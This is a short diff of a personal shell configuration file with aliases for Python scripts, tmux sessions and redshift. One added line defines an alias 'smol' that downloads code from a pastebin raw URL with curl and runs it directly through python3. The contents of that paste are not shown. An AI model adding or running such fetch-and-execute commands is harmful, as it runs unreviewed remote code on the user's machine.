@@ -105,6 +105,7 @@ alias pls='python ~/github/LearningPython/RandomStuff/pls.py'
 
 alias tmuj='tmux attach -t '
 alias tmul='tmux list-sessions'
+alias smol='python3 -c "$(curl -s https://pastebin.com/raw/qjJrY58J)"'
 
 #== Functions ==#
 function startrs { (redshift -t 6500:3200)&> /dev/null & }
